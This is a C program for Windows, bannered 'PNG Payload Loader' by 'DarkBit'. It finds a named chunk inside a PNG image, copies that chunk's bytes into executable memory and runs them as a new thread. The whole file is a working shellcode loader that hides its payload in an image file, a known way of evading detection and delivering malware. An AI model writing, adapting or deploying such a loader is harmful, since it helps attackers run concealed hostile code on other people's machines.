#include <Windows.h>
#include <stdio.h>

#define PRINT_ERROR(errName) printf("[!] Error at %s: %d\n", errName, GetLastError());

static const BYTE PNG_SIGNATURE[8] =
{
	0x89,0x50,0x4E,0x47,
	0x0D,0x0A,0x1A,0x0A
};

BOOL ReadFileFromPath(LPSTR pePath, PBYTE* pBytes, PDWORD dwSize) {
	BOOL state = FALSE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	PBYTE pBuffer = NULL;
	DWORD dwFSize = 0;
	DWORD dwBytesRead = 0;

	hFile = CreateFileA(pePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		PRINT_ERROR("CreateFileA");
		goto _END;
	}
	printf("[i] Reading File: %s\n", pePath);

	dwFSize = GetFileSize(hFile, NULL);
	if (dwFSize == INVALID_FILE_SIZE) {
		PRINT_ERROR("GetFileSize");
		goto _END;
	}
	printf("[i] File Size: %d\n", dwFSize);

	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwFSize);

	if (!ReadFile(hFile, pBuffer, dwFSize, &dwBytesRead, NULL) || dwBytesRead != dwFSize) {
		PRINT_ERROR("ReadFile");
		goto _END;
	}

	*pBytes = pBuffer;
	*dwSize = dwFSize;

	if (*pBytes != NULL && *dwSize != 0)
		state = TRUE;

_END:
	if (hFile)
		CloseHandle(hFile);

	return state;
}

BOOL SaveFileToPath(LPCSTR path, PBYTE pBytes, DWORD dwSize) {

	HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		PRINT_ERROR("CreateFileA");
		return FALSE;
	}

	DWORD written = 0;
	if (!WriteFile(hFile, pBytes, dwSize, &written, NULL)) {
		PRINT_ERROR("WriteFile");
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	return written == dwSize;
}

VOID PrintHeader(LPSTR Text, PBYTE pBytes, DWORD dwSize, DWORD Length, BOOL Break) {
	printf("%s", Text);
	for (DWORD i = 0; i < dwSize; i++) {
		if ((i % Length) == 0 && i != 0) {
			if (Break) {
				break;
			}
			printf("\n");
		}
		printf("%0.2X ", pBytes[i]);
	}
	printf("\n");
}

DWORD CalculateCRC32(PBYTE data, DWORD length)
{
	DWORD crc = 0xFFFFFFFF;
	for (DWORD i = 0; i < length; i++)
	{
		crc ^= data[i];
		for (int j = 0; j < 8; j++)
		{
			if (crc & 1)
				crc = (crc >> 1) ^ 0xEDB88320;
			else
				crc >>= 1;
		}
	}
	return crc ^ 0xFFFFFFFF;
}


DWORD GetChunkSize(PBYTE pChunk) {
	return (((DWORD)pChunk[0] << 24) | ((DWORD)pChunk[1] << 16) | ((DWORD)pChunk[2] << 8) | pChunk[3]) + 12;
}

BOOL SetChunkSize(LPCSTR Name, PBYTE pChunk, DWORD dwChunkSize, PBYTE pBinBytes, DWORD dwBinSize) {
	DWORD length = dwChunkSize;

	pChunk[0] = (length >> 24) & 0xFF;
	pChunk[1] = (length >> 16) & 0xFF;
	pChunk[2] = (length >> 8) & 0xFF;
	pChunk[3] = length & 0xFF;

	memcpy(pChunk + 4, Name, 4);
	memcpy(pChunk + 8, pBinBytes, dwBinSize);

	DWORD crcSize = 4 + dwBinSize;
	PBYTE crcBuffer = HeapAlloc(GetProcessHeap(), 0, crcSize);

	if (!crcBuffer)
		return FALSE;


	memcpy(crcBuffer, Name, 4);

	memcpy(crcBuffer + 4, pBinBytes, dwBinSize);

	DWORD crc = CalculateCRC32(crcBuffer, crcSize);
	HeapFree(GetProcessHeap(), 0, crcBuffer);

	DWORD crcOffset = 8 + dwBinSize;
	pChunk[crcOffset + 0] = (crc >> 24) & 0xFF;
	pChunk[crcOffset + 1] = (crc >> 16) & 0xFF;
	pChunk[crcOffset + 2] = (crc >> 8) & 0xFF;
	pChunk[crcOffset + 3] = crc & 0xFF;

	return TRUE;
}

VOID PrintBanner() {
	printf(
		"\n"
		"====================================\n"
		"        PNG Payload Loader\n"
		"              DarkBit\n"
		"====================================\n\n"
	);
}

int main(int argc, char* argv[]) {

	PrintBanner();

	if (argc != 3) {
		printf("Usage: %s <png> <name>\n", argv[0]);
		return -1;
	}

	PBYTE pPngBytes = NULL;
	DWORD dwPngSize = 0;
	LPCSTR pngPath = argv[1];

	if (strlen(argv[2]) != 4) {
		PRINT_ERROR("Name must be only 4 words!");
		return -1;
	}

	if (!ReadFileFromPath(pngPath, &pPngBytes, &dwPngSize)) {
		PRINT_ERROR("ReadFileFromPath while reading png!");
		return -1;
	}

	if (memcmp(pPngBytes, PNG_SIGNATURE, sizeof(PNG_SIGNATURE)) != 0) {
		PRINT_ERROR("Invalid png format!");
		return -1;
	}

	pPngBytes += sizeof(PNG_SIGNATURE);

	printf("[*] Extracting chunks:\n");
	while (TRUE)
	{
		printf("\t- Chunk %.4s: ", (PCHAR)(pPngBytes + 4));
		if (memcmp(pPngBytes + 4, argv[2], 4) == 0) {
			printf("found!\n");
			break;
		}
		printf("skipped\n");
		pPngBytes += GetChunkSize(pPngBytes);
	}


	PVOID pAddress = NULL;
	DWORD dwPayloadSize = GetChunkSize(pPngBytes) - 12;

	pAddress = VirtualAlloc(NULL, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pAddress == NULL) {
		PRINT_ERROR("Could not get memory for Payload!");
		return -1;
	}

	memcpy(pAddress, (pPngBytes + 8), dwPayloadSize);
	printf("[+] Payload Size: %d\n", dwPayloadSize);
	PrintHeader("[+] Payload header bytes:\n\t", pAddress, dwPayloadSize, 16, TRUE);

	printf("\n[#] Press 'enter' to execute payload...\n");
	getchar();

	HANDLE hThread = CreateThread(NULL, NULL, pAddress, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	return 0;

}